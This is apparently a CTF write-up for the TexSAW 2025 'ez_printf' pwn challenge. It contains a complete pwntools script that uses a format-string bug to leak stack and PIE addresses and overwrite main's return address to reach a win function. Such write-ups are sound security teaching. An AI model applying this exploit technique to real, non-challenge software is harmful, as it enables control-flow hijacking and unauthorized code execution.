# Challenge ez_printf: TexSAW 2025

## PWN: Leak the stack and pie

---

## Description

As the name suggests, this is an easy printf challenge. The binary contains two `printf(user_input)` calls and a `win` function. The goal is simple: leak stack and PIE addresses using the first `printf`, then overwrite the return address of `main` with the address of `win`.

---

## Solution

We start by analyzing the binary and find that it gives us a format string vulnerability. Using this, we can leak important addresses and craft a payload to hijack the control flow.

Here's the provided exploit script:

```python
from pwn import *

context.log_level = logging.ERROR
elf = context.binary = ELF("vuln")

p = process()
# p = remote("74.207.229.59", 20221)

p.recvuntil("t twice")
p.recvline()

p.sendline(f"%1$p|%3$p|%27$p")
STACK, LIBC, PIE = p.recvline().strip().split(b"|")
STACK = int(STACK[2:], 16)
PIE = int(PIE[2:], 16) - 0x11b3

print(hex(STACK))
print(hex(PIE))

elf.address = PIE

payload = fmtstr_payload(6, {STACK - 8: elf.sym["win"] + 1}, write_size="short")
print("payload len: ", hex(len(payload)))
p.sendline(payload)

p.interactive()
```

### Step-by-Step Breakdown:

1. **Leak Addresses:**
   - Send `%1$p|%3$p|%27$p` to leak stack, libc, and PIE addresses.
   - Adjust the PIE base by subtracting the known offset (`0x11b3`).

2. **Calculate Targets:**
   - `elf.address` is updated to the new PIE base.
   - The return address on the stack (`STACK - 8`) is targeted.

3. **Craft Payload:**
   - Use `fmtstr_payload` to overwrite the return address with the `win` function's address.
   - `write_size="short"` ensures a minimal and efficient payload.

4. **Exploit:**
   - Send the crafted payload.
   - Interact with the shell after winning control.

### Final Result

Upon successful execution, the binary jumps to the `win` function, completing the challenge.

